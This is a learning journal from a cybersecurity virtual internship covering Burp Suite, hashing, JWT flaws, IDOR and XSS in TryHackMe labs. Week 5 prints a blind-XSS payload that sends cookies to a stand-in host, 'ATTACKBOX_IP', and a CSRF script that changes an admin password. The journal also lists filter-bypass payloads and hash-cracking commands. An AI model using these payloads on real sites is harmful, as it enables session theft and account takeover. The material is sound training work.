# MWR Cybersecurity Virtual Internship — Learning Journal
**Intern:** Thandolwami Christian Mashele  
**Qualification:** BCom Applied Information Systems — University of Johannesburg  
**Internship:** MWR Cybersecurity Virtual Internship  
**GitHub:** [linux-cloud-journal](https://github.com/cmashele85/linux-cloud-journal)  
**LinkedIn:** [linkedin.com/in/thandolwami-mashele](https://linkedin.com/in/thandolwami-mashele)

---

## About This Journal

This journal documents my weekly progress through the MWR Cybersecurity Virtual Internship. Each entry covers the concepts I studied, the practical exercises I completed, the challenges I faced, and the lessons I took away. I update this journal every week as I progress through the programme.

The internship covers real-world cybersecurity topics including web application security, cryptography, network analysis, and penetration testing techniques. All practical work is done using TryHackMe rooms, the AttackBox, and tools such as Burp Suite, Hashcat, CyberChef, and Python.

---

## Table of Contents

- [Week 1 — Cybersecurity Fundamentals Using Burp Suite](#week-1--cybersecurity-fundamentals-using-burp-suite)
- [Week 2 — Encoding, Encryption and Hashing](#week-2--encoding-encryption-and-hashing)
- [Week 3 — Authentication and Passwords](#week-3--authentication-and-passwords)
- [Week 4 — Authorisation and Sessions](#week-4--authorisation-and-sessions)
- [Week 5 — Client-Side Exploitation and XSS](#week-5--client-side-exploitation-and-xss)

---

## Week 1 — Cybersecurity Fundamentals Using Burp Suite

**Focus Area:** Web Application Testing Tools and the IAAA Security Model

---

### Overview

Week 1 introduced me to the foundational concepts of cybersecurity and the tools used by penetration testers to test web applications. The main tool covered was Burp Suite — an industry-standard web application security testing platform. The week also covered the IAAA model which forms the theoretical backbone of how secure systems manage users.

---

### Burp Suite

#### What is Burp Suite?
Burp Suite is a web application testing toolkit that sits between your browser and a website. It intercepts, inspects, and allows manipulation of all traffic passing between them. It is one of the most widely used tools in penetration testing and bug bounty hunting.

#### Key Features

| Feature | What it does | My Priority |
|---------|-------------|-------------|
| **Proxy** | Intercepts and modifies requests and responses in real time | 🥇 Most important |
| **Repeater** | Captures a request and lets you resend it multiple times with modifications | 🥈 Second most important |
| **Intruder** | Automates attacks by sending many requests to an endpoint — used for brute force and fuzzing | 🥉 Third |
| **Decoder** | Encodes and decodes data in various formats — similar to CyberChef but built in | Situational |
| **Comparer** | Compares two pieces of data side by side at word or byte level | Situational |
| **Sequencer** | Tests how random tokens are — weak randomness in session cookies can lead to account hijacking | Situational |

#### Key Shortcuts and Facts

| Detail | Value |
|--------|-------|
| Default Proxy address | `127.0.0.1:8080` |
| Send to Repeater | `Ctrl + R` |
| Send to Intruder | `Ctrl + I` |
| Extension languages supported | Java, Python (Jython), Ruby (JRuby) |
| Extension marketplace | BApp Store |
| Pink decoding scheme in Decoder | Base64 |
| Race condition attack location | `Repeater → Send → Send group in parallel (last-byte sync)` |

---

### The IAAA Model

#### What is IAAA?
IAAA stands for Identification, Authentication, Authorisation, and Accountability. These are the four pillars of information security that govern how users are managed in any secure system.

```
I → A → A → A
│    │    │    └── Accountability  = logging and tracking what you did
│    │    └─────── Authorisation   = deciding what you are allowed to do
│    └──────────── Authentication  = proving that you are who you claim to be
└───────────────── Identification  = claiming who you are
```

#### Simple Analogy — A Secure Office Building

| Stage | The Question | Real World Example |
|-------|-------------|-------------------|
| Identification | "Who are you?" | Telling the security guard your name |
| Authentication | "Prove it" | Showing your employee ID card |
| Authorisation | "What are you allowed to access?" | Your access card only opens certain doors |
| Accountability | "We are recording what you do" | Security cameras logging your movements |

#### Identification
The process of claiming a specific identity using a unique identifier.

Valid identifiers include: username, email address, national ID number, student ID number, passport number, mobile number, landline number, health insurance card number.

Invalid identifier: **Street number** — not unique to one person. Multiple people across different cities and countries can share the same street number, making it useless for identification.

> Key rule: If multiple people can share the same value, it cannot be used as an identifier.

#### Authentication — The Five Methods

| Method | Examples |
|--------|---------|
| Something you know | Password, PIN, passphrase, unlock pattern |
| Something you have | Phone, hardware security key, OTP generator, SIM card |
| Something you are | Fingerprint, facial recognition, retina scan, voice recognition |
| Somewhere you are | Physical or logical location |
| Something you do | Behavioural patterns |

#### Multi-Factor Authentication (MFA)
Using two or more methods from **different categories** simultaneously.

| Example | Type | Reason |
|---------|------|--------|
| Password only | Single factor | Only "something you know" |
| ATM card + PIN | 2FA | "Something you have" + "something you know" |
| Fingerprint + password | 2FA | "Something you are" + "something you know" |
| Swipe card + PIN at elevator | 2FA | "Something you have" + "something you know" |

> Important: Two methods must come from **different categories** to count as 2FA. Entering a PIN twice is still single factor authentication.

---

### Challenges Faced This Week

**Challenge 1 — Understanding the difference between Identification and Authentication**
At first I confused these two steps. I thought entering a username was authentication. Through the gym analogy it became clear: telling the receptionist your name (identification) is not the same as showing your membership card (authentication). Identification is the claim, authentication is the proof.

**Challenge 2 — CyberChef not loading properly**
During practical exercises CyberChef was difficult to use because dragging operations into the Recipe box was not working. I discovered that double-clicking the operation adds it to the recipe without needing to drag. This became my standard method going forward.

---

### Key Takeaways

1. Burp Suite Proxy and Repeater are the two most critical features for web application testing
2. IAAA must happen in order — you cannot authorise someone who has not been authenticated
3. Identification only requires a claim — authentication requires proof
4. 2FA needs two **different** types of factors — same type twice does not count
5. Every component of Burp Suite has a specific purpose — learning all of them is worth the time

---

## Week 2 — Encoding, Encryption and Hashing

**Focus Area:** Data Representation, Cryptography, and Password Security

---

### Overview

Week 2 covered three fundamentally different ways of transforming data: encoding, encryption, and hashing. A critical lesson from this week is understanding that these are not the same thing and serve very different purposes. The week also covered historical ciphers, modern encryption algorithms, and practical hash cracking using real tools.

---

### Encoding

Encoding is the process of converting data from one format to another. It is **not** encryption. Anyone can reverse it without a key. Its purpose is data representation, not security.

#### URL Encoding (Percent Encoding)
Special characters in URLs are replaced with `%` followed by two hexadecimal digits representing the character's byte value.

| Character | URL Encoded |
|-----------|------------|
| Space | `%20` |
| / | `%2F` |
| ? | `%3F` |
| = | `%3D` |
| & | `%26` |
| " | `%22` |

**Practical exercise decoded:**
```
%2Froom%2Fmwr-virtual-internship-week-2-we-love-cybersec%3FParameter%3DURL%20parameter%201%26Param2%3DAnother%20we!rd%20parameter
```
Decoded to:
```
/room/mwr-virtual-internship-week-2-we-love-cybersec?Parameter=URL parameter 1&Param2=Another we!rd parameter
```

Note: The `!` character was not encoded because it does not break URL structure and does not need encoding.

#### Base64 Encoding
Converts any binary data into 64 printable characters (A-Z, a-z, 0-9, +, /). Output is always approximately 33% larger than input and often ends with `=` or `==` as padding.

**How to manually decode Base64 (step by step):**
1. Look up each character in the Base64 table to get its value (0-63)
2. Convert each value to 6-bit binary
3. Join all bits into one long string
4. Split into groups of 8 bits (bytes)
5. Convert each byte to a decimal number
6. Look up each number in the ASCII table to get the character

**Example — decoding `TXkg`:**

| Character | Value | 6-bit Binary |
|-----------|-------|-------------|
| T | 19 | 010011 |
| X | 23 | 010111 |
| k | 36 | 100100 |
| g | 32 | 100000 |

Joined: `010011010111100100100000`  
Split into bytes: `01001101 01111001 00100000`  
Decimal values: 77, 121, 32  
ASCII characters: M, y, (space)  
Result: `My `

**Decoded the full string:**
- Input: `TXkgRmlyc3QgQmFzZTY0IERlY29kZQo=`
- Output: `My First Base64 Decode`

**In cybersecurity:** Attackers hide malicious commands in Base64 to bypass filters. Spot it by looking for random-looking strings of letters and numbers ending in `=`.

#### HTML Encoding
Converts special characters so browsers display them as text instead of executing them as HTML or JavaScript. This is the primary defence against XSS attacks.

| Character | HTML Encoded |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `&` | `&amp;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

---

### Cryptography

#### Key Terms

| Term | Simple Meaning |
|------|---------------|
| Plaintext | Original readable data before encryption |
| Ciphertext | Scrambled unreadable data after encryption |
| Cipher | The method or algorithm used to encrypt and decrypt |
| Key | The secret needed to decrypt ciphertext back to plaintext |
| Passphrase | A password used to protect the key itself |
| Encoding | NOT encryption — just a different format, immediately reversible |
| Brute force | Trying every possible key until one works |
| Cryptanalysis | Finding a mathematical weakness to break encryption |

#### Symmetric vs Asymmetric Encryption

| Type | How it works | Speed | Key size | Examples |
|------|-------------|-------|----------|---------|
| Symmetric | Same key encrypts and decrypts | Fast | 128-256 bit | AES, DES, Triple DES, Blowfish |
| Asymmetric | Public key encrypts, private key decrypts | Slower | 2048-4096 bit | RSA, Elliptic Curve |

#### Key Exchange — How HTTPS Works
The problem: How do two parties agree on a secret key without a spy intercepting it?

The solution using the padlock metaphor:
1. Your friend sends you an open padlock (their public key) — they keep the key
2. You lock your secret inside a box using their padlock and send it
3. Only your friend can open it using their private key
4. Now you both share the secret and can communicate using faster symmetric encryption

This is exactly how every HTTPS connection works in your browser.

#### Modulo Operator (%)
Returns the remainder after division. Used extensively in cryptographic algorithms because it is not reversible.

```
25 % 5 = 0   (divides perfectly, no remainder)
23 % 6 = 5   (23 ÷ 6 = 3, remainder 5)
```

If someone gives you `x % 5 = 4`, there are infinite possible values of x. This irreversibility is what makes it useful in cryptography.

#### Caesar Cipher
Shifts each letter by a fixed number of positions in the alphabet.

**Encryption example (shift right by 3):**
```
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓
D E F G H I J K L M N O P Q R S T U V W X Y Z A B C
```

- Plaintext: `TRYHACKME` → Ciphertext: `WUBKDFNPH`
- Only 25 possible keys → completely insecure by modern standards

**Challenge cracked:**
- Ciphertext: `XRPCTCRGNEI`
- Method: Brute forced all 25 shifts
- Key: 15 (shift left 15)
- Plaintext: `ICANENCRYPT`

#### Practical Encryptions Completed

**Triple DES Encryption:**
- Plaintext: `Let's encrypt something`
- Key: `Weneeda24bytekeyforthis1`
- IV: `Theivis8` | Mode: CBC
- Result: `d1cd629d1771610b41b2d4975acc178f3d158b4fd66cf5bf`

**Blowfish Decryption:**
- Encrypted: `88f022072f8c065c8abd87b19b35008b6c9763b78a9e4834`
- Key: `Thisisakey` | IV: `password` | Mode: CBC
- Result: `MWR{Encryption-is-Fun}`

---

### Hashing

#### What is Hashing?
A one-way function that converts any input into a fixed-size output. Unlike encryption, hashing cannot be reversed and requires no key.

Properties of a good hash function:
- Same input always gives the same output
- Any tiny change in input produces a completely different output
- Fast to compute, impossible to reverse
- Fixed output size regardless of input size

#### Why Hashing is Used for Passwords
Websites store the hash of your password — not the password itself. When you log in, the site hashes what you typed and compares it to the stored hash. If they match, you are authenticated. This way, even if the database is stolen, attackers only get hashes — not real passwords.

#### Hash Collisions
When two different inputs produce the same hash output. MD5 and SHA1 have been broken through engineered collisions and should never be used for passwords.

#### Rainbow Tables and Salting

**Rainbow table:** A pre-built lookup table mapping hashes to their original passwords.

| Hash | Password |
|------|----------|
| `e10adc3949ba59abbe56e057f20f883e` | 123456 |
| `5f4dcc3b5aa765d61d8327deb882cf99` | password |

**Salt:** A random string added to each password before hashing — makes rainbow tables useless because every user gets a unique hash even if they share the same password.

#### Identifying Hash Types by Length

| Characters | Algorithm | Bits |
|-----------|-----------|------|
| 32 | MD5 | 128 |
| 40 | SHA-1 | 160 |
| 64 | SHA-256 | 256 |
| 96 | SHA-384 | 384 |
| 128 | SHA-512 | 512 |

Formula: **bits ÷ 4 = number of hex characters**

#### Unix Hash Prefixes

| Prefix | Algorithm |
|--------|-----------|
| `$1$` | MD5crypt |
| `$2$` / `$2y$` / `$2a$` | Bcrypt |
| `$6$` | SHA-512crypt |

#### Hash Cracking Tools

| Tool | Best For | Command Example |
|------|---------|----------------|
| CrackStation | Quick online rainbow table lookup | Paste hash at crackstation.net |
| Hashcat | GPU-based wordlist cracking | `hashcat -m 1400 hash.txt rockyou.txt` |
| John the Ripper | CPU-based cracking, works in VMs | `john --wordlist=rockyou.txt hash.txt` |

#### Hashcat Hash Type Numbers

| Number | Hash Type |
|--------|-----------|
| 0 | MD5 |
| 100 | SHA-1 |
| 1400 | SHA-256 |
| 1700 | SHA-512 |
| 1000 | NTLM (Windows) |
| 3200 | Bcrypt |
| 110 | SHA-1 with salt |
| 16500 | JWT |

> ⚠️ **NEVER use `--force` with Hashcat** — causes false positives and false negatives

#### Hashes Cracked This Week
- `5f4dcc3b5aa765d61d8327deb882cf99` → MD5 → **password**
- `88f022072f8c065c8abd87b19b35008b6c9763b78a9e4834` → Blowfish → **MWR{Encryption-is-Fun}**

---

### Challenges Faced This Week

**Challenge 1 — CyberChef not working for Blowfish decryption**
CyberChef kept returning "Unable to decrypt input with these parameters" for the Blowfish exercise. I tried multiple key format combinations (UTF8, Hex) and none worked. I resolved this by running a Python script directly which successfully decrypted the value to `MWR{Encryption-is-Fun}`.

**Challenge 2 — Manually decoding Base64**
The task material did not provide the ASCII table or explain how to convert binary to decimal. I had to learn the bit position values (128, 64, 32, 16, 8, 4, 2, 1) independently to complete the manual decode. The formula is: add up the values of all positions that contain a 1.

**Challenge 3 — Finding rockyou.txt**
The wordlist was not on my system. I downloaded it directly from GitHub using a link and saved it to my Downloads folder. I then confirmed the path using Git Bash before using it with Hashcat.

**Challenge 4 — Base64 vs JWT confusion**
Initially confused Base64-encoded cookies for JWT tokens. Learned the key difference: JWTs always contain exactly **two dots** separating three parts. A Base64 string with no dots is just a cookie or encoded value, not a JWT.

---

### Key Takeaways

1. Encoding is not encryption — anyone can reverse it without a key
2. Hashing is not encryption — it is one-way and cannot be reversed
3. Symmetric encryption is fast but requires secure key exchange
4. Asymmetric encryption solves the key exchange problem and is how HTTPS works
5. MD5 and SHA1 are broken — never use them for passwords
6. Salting makes rainbow tables useless — always use salted hashing for passwords
7. Base64 strings ending in `=` are a strong indicator of encoded data hiding something
8. Real cybersecurity work uses tools like CyberChef and Hashcat — manual steps build the understanding of what those tools are doing

---

## Week 3 — Authentication and Passwords

**Focus Area:** Authentication Methods, Password Security, and Session Management

---

### Overview

Week 3 built on the IAAA model from Week 1 by going deeper into authentication specifically. The week covered how systems verify user identity, the different authentication methods available, the weaknesses in password-based authentication, and how modern systems protect against common attacks.

---

### Authentication Methods in Depth

#### Something You Know
The most common authentication method. Examples include passwords, PINs, passphrases, and unlock patterns.

**Weaknesses:**
- Passwords can be guessed, stolen, or cracked
- People reuse passwords across multiple platforms
- Weak passwords are vulnerable to brute force and dictionary attacks

**Best practices:**
- Use long passphrases instead of short complex passwords
- Never reuse passwords across platforms
- Use a password manager

#### Something You Have
Physical objects used to prove identity. Examples include phone (SMS OTP), hardware security keys (YubiKey, Titan), and SIM cards.

**How OTP via SMS works:**
1. You register a phone number as your identity
2. The system sends a code to that number
3. Reading the code proves you have possession of that SIM card

#### Something You Are
Biometric authentication. Examples include fingerprint readers, facial recognition, retina scanners, and voice recognition.

**Advantages:** Cannot be forgotten or stolen easily  
**Disadvantages:** Cannot be changed if compromised — you cannot reset your fingerprint

#### Multi-Factor Authentication
Combining two or more methods from different categories. The more factors required, the harder it is for an attacker to compromise an account.

---

### Password Storage and Attacks

#### Why Plain Text Storage is Dangerous
If a database storing plaintext passwords is breached, every user's password is immediately exposed. Real examples: RockYou (2009) — 14 million plaintext passwords leaked. Adobe — encrypted passwords with insecure encryption, quickly reversed by attackers.

#### The rockyou.txt Wordlist
The rockyou.txt file contains over 14 million real passwords from the RockYou data breach. It is the standard wordlist used in penetration testing and hash cracking. Available on Kali Linux at `/usr/share/wordlists/rockyou.txt`.

#### Password Cracking Process
1. Obtain the hash from a database or system
2. Take a wordlist (e.g. rockyou.txt)
3. Hash each word using the same algorithm
4. Compare each generated hash to the target hash
5. When they match — the password is found

#### Why GPUs Are Used for Cracking
Graphics cards have thousands of cores optimised for the mathematical operations used in hash functions. A modern GPU can compute billions of hashes per second. Bcrypt is specifically designed to be equally slow on both GPU and CPU, which is why it is the recommended algorithm for password storage.

---

### Challenges Faced This Week

**Challenge 1 — Hash cracking websites blocked**
CrackStation and several alternative hash cracking sites were inaccessible from my network. I resolved this by using Hashcat locally with the rockyou.txt wordlist I had downloaded.

**Challenge 2 — rockyou.txt path in Git Bash**
The `$USER` environment variable was not resolving correctly in Git Bash, causing file not found errors. I resolved this by using my full name directly in the path: `/c/Users/Thando Mashele/Downloads/rockyou.txt`.

**Challenge 3 — MD4 not supported**
When trying to crack an NTLM hash using Python, the MD4 algorithm returned an unsupported error on my Python version. NTLM uses MD4 internally. I worked around this by using Hashcat with `-m 1000` instead.

---

### Key Takeaways

1. Never store passwords in plaintext — always hash them
2. Never use MD5 or SHA1 for password hashing — they are broken
3. Always use salted hashing — bcrypt and SHA-512crypt handle this automatically
4. The rockyou.txt wordlist is the standard starting point for password cracking
5. GPUs crack hashes much faster than CPUs — except for bcrypt which is designed to resist GPU acceleration
6. Multi-factor authentication significantly reduces the risk of account compromise even if a password is stolen

---

## Week 4 — Authorisation and Sessions

**Focus Area:** Authorisation Vulnerabilities, IDOR, JWT Security

---

### Overview

Week 4 moved from authentication (proving who you are) to authorisation (what you are allowed to do). The week covered how systems make and enforce access control decisions, common vulnerabilities in authorisation implementations, and how JSON Web Tokens work and can be exploited.

---

### Authorisation vs Authentication

| Concept | Question | Stage |
|---------|---------|-------|
| Authentication | Are you who you say you are? | Before access |
| Authorisation | What are you allowed to do? | After access |

Authorisation failures allow authenticated users to access data or perform actions beyond their permitted scope.

---

### IDOR — Insecure Direct Object Reference

#### What is IDOR?
When a web application uses user-controllable values (like an ID number in a URL) to directly access objects (like database records) without verifying that the requesting user is authorised to access that object.

#### Practical Discovery
While investigating the account page of the TryHackMe lab, I found this JavaScript in the page source:

```javascript
$.getJSON('/api/v1/customer?id=50', function(resp){
    $('input[name="account_username"]').val(resp.username);
    $('input[name="account_email"]').val(resp.email);
});
```

This revealed that my user ID was 50 and that the API returned user data based solely on the ID parameter with no authorisation check.

**Testing the vulnerability:**
```
/api/v1/customer?id=1  → {"id":1,"username":"adam84","email":"adam-84@fakemail.thm"}
/api/v1/customer?id=50 → {"id":50,"username":"cmashele85","email":"cmashele85@gmail.com"}
```

Simply changing the number exposed another user's personal information.

**Why this is dangerous:**
- No authentication bypass required
- Any logged-in user can access any other user's data
- In a real system this could expose names, emails, addresses, payment details

**The fix:** The server must verify that the authenticated user's ID matches the requested ID before returning any data.

---

### JSON Web Tokens (JWTs)

#### What is a JWT?
A compact, self-contained token used to transmit information between parties securely. Always has three parts separated by dots:

```
eyXXXXXX.eyXXXXXX.XXXXXXXXX
   │          │         │
 Header    Payload   Signature
```

- **Header:** Specifies the algorithm used (e.g. HS256, RS256)
- **Payload:** Contains the claims — user data like username, ID, admin status
- **Signature:** Verifies the token has not been tampered with

Every JWT starts with `eyJ` because `eyJ` is the Base64 encoding of `{"` which is how JSON objects begin.

#### How to Spot a JWT
- Contains exactly **two dots**
- Starts with `eyJ`
- Three distinct sections when split by dots

#### Difference Between JWT and Base64 Cookie

| Type | Dots | Starts with | Example |
|------|------|------------|---------|
| JWT | ✅ Exactly 2 | `eyJ` | `eyJhbGc.eyJ1c2Vy.SflKxwR` |
| Base64 cookie | ❌ None | `eyJ` | `eyJpZCI6IjZhZmQy...` |

#### Common JWT Vulnerabilities

**1. No Signature Verification**
The server accepts a JWT without checking whether the signature is valid. An attacker can modify any claim in the payload.

Attack steps:
1. Get a valid JWT
2. Decode the payload (Base64)
3. Modify a claim (e.g. `"admin":0` → `"admin":1`)
4. Re-encode the payload
5. Remove the signature (leave only the dot)
6. Send the modified token

Vulnerable code:
```python
payload = jwt.decode(token, options={'verify_signature': False})
```

Fix:
```python
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

**2. Algorithm Downgrade to None**
JWTs support a `None` algorithm meaning no signature is used. If developers do not explicitly block this, an attacker changes `alg` to `None` and the library always returns true for signature verification.

Fix: Explicitly specify allowed algorithms:
```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"])
```

**3. Weak Symmetric Secret**
If a weak secret is used to sign the JWT, it can be cracked offline:
```bash
hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list
```

Fix: Use a long, random string as the JWT secret — never use example secrets from tutorials.

**4. Algorithm Confusion (RS256 → HS256)**
When both symmetric and asymmetric algorithms are allowed, an attacker can downgrade from RS256 to HS256 and use the public key as the secret to forge a valid signature.

Fix: Never mix symmetric and asymmetric algorithms without additional logic to handle each separately.

---

### Flag Found During Practical

While investigating HTTP response headers using curl with the `-v` (verbose) flag, a flag was discovered hidden in the response:

```bash
curl -v -H 'Content-Type: application/json' -X POST \
-d '{"username":"cmashele85","password":"Thando2003"}' \
http://10.114.135.146/api/v1/customer/login
```

Response header revealed:
```
X-FLAG: THM{HEADER_FLAG}
```

**Lesson learned:** Always inspect HTTP response headers thoroughly. Sensitive information — including flags in CTF challenges and accidentally exposed data in real systems — is sometimes leaked through custom response headers. The `-v` flag in curl is essential for seeing full verbose output including all headers.

---

### Challenges Faced This Week

**Challenge 1 — JWT vs Base64 cookie confusion**
Several cookies in the browser were Base64 encoded and started with `eyJ` just like a JWT. I spent time trying to decode these thinking they were JWTs. Learned the key distinguishing feature: a JWT always has exactly two dots separating three sections. A Base64 string with no dots is just an encoded cookie.

**Challenge 2 — Finding the correct API endpoint**
The JWT example exercises used `/api/v1.0/example2` but this endpoint returned 404 from both Git Bash and the browser. After investigation I discovered these endpoints only existed on a separate machine that required a paid TryHackMe subscription to start. The customer website (`10.114.135.146`) only hosted the IDOR exercise.

**Challenge 3 — AttackBox expiring mid-exercise**
The AttackBox timed out during the JWT exercises. By the time I restarted it, I had to redo the VPN setup. Going forward I will work more efficiently within the AttackBox session time limit and save all commands I plan to run before starting.

**Challenge 4 — Subscription limitation**
The JWT practical examples (Examples 2-5) required a TryHackMe Premium subscription to access the dedicated machine. I studied these concepts theoretically and understood the attack methodology but could not complete the practicals. I noted this in my submission to Jonno.

---

### Key Takeaways

1. Authorisation must be enforced server-side — never trust client-side values like cookies or URL parameters
2. IDOR is one of the most common and simplest web vulnerabilities — changing a number in a URL can expose any user's data
3. JWTs have exactly two dots — this is how you distinguish them from other Base64 encoded values
4. JWT signatures must always be verified server-side — never use `verify_signature: False` in production
5. The `None` algorithm must always be explicitly blocked in JWT implementations
6. HTTP response headers can leak sensitive information — always inspect them thoroughly
7. The `-v` flag in curl shows full verbose output including all headers — use it by default

---

## Week 5 — Client-Side Exploitation and XSS

**Focus Area:** Cross-Site Scripting, Cookie Stealing, Session Hijacking, and CSRF

---

### Overview

Week 5 focused on client-side exploitation techniques — specifically Cross-Site Scripting (XSS) and how it can be chained with other attack techniques to escalate privileges progressively from a regular user all the way to admin. The practical challenge was a TryHackMe room called "What's Your Name?" — a simulated social media platform called WorldWap where a moderator reviews new registrations and an admin bot monitors the chat feature.

The key insight this week: a single XSS vulnerability, combined with an understanding of how the application flows, can lead to complete account takeover of privileged users.

---

### Cross-Site Scripting (XSS)

#### What is XSS?
A vulnerability that allows attackers to inject malicious scripts into web pages that are then executed in other users' browsers. The victim's browser has no way to know the script is not legitimate — it came from a trusted website.

#### Types of XSS

| Type | How it works | When payload executes |
|------|-------------|----------------------|
| **Reflected XSS** | Payload is in the URL or form input and reflected immediately in the response | When victim clicks a crafted link |
| **Stored XSS** | Payload is stored in the database and served to every user who visits | When any user loads the affected page |
| **Blind XSS** | Payload executes in a different user's browser — you cannot see the result directly | When a privileged user (admin/moderator) views the content |
| **DOM-based XSS** | Payload is processed by client-side JavaScript without ever reaching the server | When JavaScript reads from attacker-controlled sources |

#### Where to Test for Reflected XSS
- Query string parameters: `?q=test`
- URL file path segments
- HTTP headers (less common)
- Form input fields
- Search boxes

---

### XSS Payloads by Context

Different injection points require different payload formats:

| Context | Example Payload |
|---------|----------------|
| Inside HTML body | `<script>alert('THM');</script>` |
| Inside input value attribute | `"><script>alert('THM');</script>` |
| Inside textarea | `</textarea><script>alert('THM');</script>` |
| Inside JavaScript code | `';alert('THM');//` |
| Filter bypass (word removal) | `<sscriptcript>alert('THM');</sscriptcript>` |
| Filter bypass (tag stripping) | `/images/cat.jpg" onload="alert('THM');` |

#### Why Context Matters
The same payload will not work in every situation. If your input is placed inside a JavaScript string, injecting `<script>` tags will not execute. You need to break out of the JavaScript string first using `'` or `"`, then inject your code.

---

### Practical Lab — WorldWap Challenge

#### Phase 1: Cookie Stealing via Blind XSS

**Goal:** Steal the moderator's session cookie to impersonate them.

**Background:** On WorldWap, new registrations are reviewed by a moderator. If the registration form renders HTML without sanitising it, any script in the registration fields will execute in the moderator's browser when they review it.

**Step 1 — Set up a listener on the AttackBox:**
```bash
python3 -m http.server 80
```
This creates a simple HTTP server that logs all incoming requests, including any data sent to it via URL parameters.

**Step 2 — Register with a malicious payload in the name or email field:**
```html
<img src=x onerror="fetch(`http://ATTACKBOX_IP?c=${document.cookie}`, {mode:'no-cors'})" hidden>
```

How this works:
- `<img src=x>` — creates an image with an invalid source
- `onerror=` — triggers when the image fails to load (immediately, since `x` is not a real image)
- `fetch(...)` — sends the moderator's cookies to my listener as a URL parameter
- `document.cookie` — captures all cookies in the moderator's browser
- `{mode:'no-cors'}` — allows the request to be sent without CORS restrictions
- `hidden` — hides the broken image so the moderator does not notice

**Step 3 — When the moderator reviewed the registration:**
My listener received a request containing their `PHPSESSID` cookie value.

**Step 4 — Replace my session cookie:**
Using Developer Tools → Application → Cookies, I replaced my own `PHPSESSID` with the stolen value.

**Step 5 — Result:**
Successfully logged in as the moderator and captured the first flag: `ModP@wnEd`

---

#### Phase 2: Privilege Escalation to Admin via CSRF

**Goal:** Change the admin's password by exploiting a chat bot that automatically reads and processes chat messages.

**Background:** WorldWap has a chat feature monitored by an admin bot. If the chat renders HTML without sanitising it, any script posted in the chat will execute in the admin bot's browser — with admin-level session privileges.

**Step 1 — Identify the password change endpoint:**
```
http://login.worldwap.thm/change_password.php
```

**Step 2 — Craft a CSRF payload:**
```html
<script>
let url = "ht" + "tp://login.worldwap.thm/change_password.php";
fetch(url, {
  method: "POST",
  headers: {"Content-Type": "application/x-www-form-urlencoded"},
  body: "new_password=admin123"
});
</script>
```

Why the URL is split (`"ht" + "tp://"`): The chat application was auto-converting URLs into clickable links which broke the payload. Splitting the string prevented the auto-linking while still producing a valid URL when JavaScript evaluated it.

**Step 3 — Post the payload in chat:**
The admin bot read the message and executed the script in its browser. The `fetch()` request changed the admin password to `admin123` using the bot's admin session.

**Step 4 — Log in as admin:**
Credentials: `admin` / `admin123`  
Captured the second flag: `AdM!nP@wnEd`

---

### The Full Attack Chain

```
Register with XSS payload in name field
           ↓
Moderator reviews registration
           ↓
XSS executes in moderator's browser
           ↓
Moderator's PHPSESSID sent to my listener
           ↓
I replace my cookie with stolen cookie
           ↓
I am now logged in as moderator
           ↓
Post CSRF payload in chat as moderator
           ↓
Admin bot reads chat and executes payload
           ↓
Admin password changed to admin123
           ↓
I log in as admin
```

This is what is called **privilege escalation through chained vulnerabilities** — each step uses the access gained in the previous step to go higher.

---

### Defences Against XSS

| Defence | How it helps |
|---------|-------------|
| Output encoding | Converts `<` to `&lt;` so it displays as text not HTML |
| Content Security Policy (CSP) | Tells the browser which scripts are allowed to run |
| `HttpOnly` cookie flag | Prevents JavaScript from reading cookies via `document.cookie` |
| `Secure` cookie flag | Ensures cookies are only sent over HTTPS |
| Input sanitisation | Strips or rejects dangerous characters on input |
| Templating frameworks | Modern frameworks like React auto-escape output by default |

**Most important:** The `HttpOnly` flag on session cookies would have prevented the cookie stealing attack in Phase 1 entirely — `document.cookie` would have returned an empty string.

---

### Tools Used This Week

| Tool | Purpose |
|------|---------|
| Python HTTP server | Cookie listener to capture stolen session data |
| Browser Developer Tools | Cookie manipulation, request inspection |
| Burp Suite | Request interception and modification |
| TryHackMe AttackBox | Attack environment with network access to target |
| Nmap | Port enumeration on the target machine |

---

### Challenges Faced This Week

**Challenge 1 — Understanding blind XSS vs reflected XSS**
With reflected XSS you immediately see whether your payload worked. With blind XSS the payload executes in someone else's browser and you see nothing — you just have to wait for your listener to receive a connection. This required a shift in thinking: success is measured by incoming requests to my listener, not by what I see on screen.

**Challenge 2 — Chat URL auto-linking breaking the CSRF payload**
When I initially posted the full URL `http://login.worldwap.thm/change_password.php` in the chat, the application converted it to an HTML link. This broke the script because the URL was no longer a plain string in the JavaScript. Splitting the URL with string concatenation (`"ht" + "tp://"`) solved this.

**Challenge 3 — Choosing the right XSS payload format**
The first few payloads I tried did not execute because I was using `<script>` tags in contexts where they would not work (inside attribute values). I learned to identify where my input appears in the page source first, then choose the appropriate payload format for that context.

---

### Key Takeaways

1. User input is always dangerous — never render it in another user's browser without sanitising it first
2. Blind XSS is often overlooked but can lead to full account compromise of privileged users
3. Context determines the payload — the same injection will not work everywhere
4. Filters can be bypassed using nested tags, event handlers, string splitting, and encoding
5. Session cookies without the `HttpOnly` flag can be stolen via JavaScript — always set this flag
6. A single XSS vulnerability can be chained into a complete privilege escalation attack
7. Thinking like an attacker means understanding the full application flow — not just individual vulnerabilities

---

## Tools Reference

| Tool | Purpose | Where to get it |
|------|---------|----------------|
| Burp Suite Community | Web application testing | portswigger.net |
| CyberChef | Encoding, decoding, encryption | gchq.github.io/CyberChef |
| CrackStation | Online hash cracking (no salt) | crackstation.net |
| Hashcat | GPU-based hash cracking | hashcat.net |
| John the Ripper | CPU-based hash cracking | openwall.com/john |
| rockyou.txt | Standard password wordlist | Built into Kali / downloadable from GitHub |
| jwt.io | JWT decoder and editor | jwt.io |
| Python HTTP server | Quick listener for catching requests | Built into Python 3 |

---

## Progress Tracker

| Week | Topic | Status | Flag(s) |
|------|-------|--------|---------|
| Week 1 | Cybersecurity Fundamentals and Burp Suite | ✅ Complete | N/A |
| Week 2 | Encoding, Encryption and Hashing | ✅ Complete | `MWR{Encryption-is-Fun}` |
| Week 3 | Authentication and Passwords | ✅ Complete | N/A |
| Week 4 | Authorisation and Sessions | ✅ Complete | `THM{HEADER_FLAG}` |
